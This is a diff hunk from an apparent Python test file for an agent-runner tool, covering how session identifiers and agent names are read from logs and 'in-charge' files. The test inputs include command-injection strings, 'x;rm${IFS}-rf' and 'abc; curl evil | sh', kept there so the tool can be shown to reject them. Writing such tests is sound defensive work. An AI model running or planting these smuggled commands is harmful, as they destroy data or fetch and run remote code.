@@ -402,6 +402,7 @@ check("and gives up, saying so, only when the runner has stayed ended for its la
 # ---- identifiers, the doctor's probe
 check("an identifier that is not plainly one is not read from a log", rr.session_in("attempt 1 of 4: new session x;rm${IFS}-rf\n") == "" and rr.session_in("attempt 1 of 4: new session 63447abd-ad04-43c4-90f3-6e91745fda9a\n") == "63447abd-ad04-43c4-90f3-6e91745fda9a")
 open(W + "/runs/in-charge", "w").write(json.dumps({"agent": "claude", "id": "abc; curl evil | sh", "at": 1}))
+check("a session log with no settings to say which agent wrote it is read for the lines the runner writes for the agent: claude, codex, or neither", (rr.agent_in("task 1.1\nclaude: done\n"), rr.agent_in("codex: done\n"), rr.agent_in("the claude: of a sentence\nx\n")) == ("claude", "codex", ""))
 check("nor from a hand-written in-charge file", rr.session_in_charge(place) is None)
 rc = subprocess.run([sys.executable, KIT + "/bin/runner_report.py", "--in-charge", "--agent", "claude", "--session", "a b;c"], capture_output=True, text=True, env={**os.environ})
 check("nor recorded by --in-charge", rc.returncode != 0 and "identifier" in rc.stderr, rc.stderr[:200])
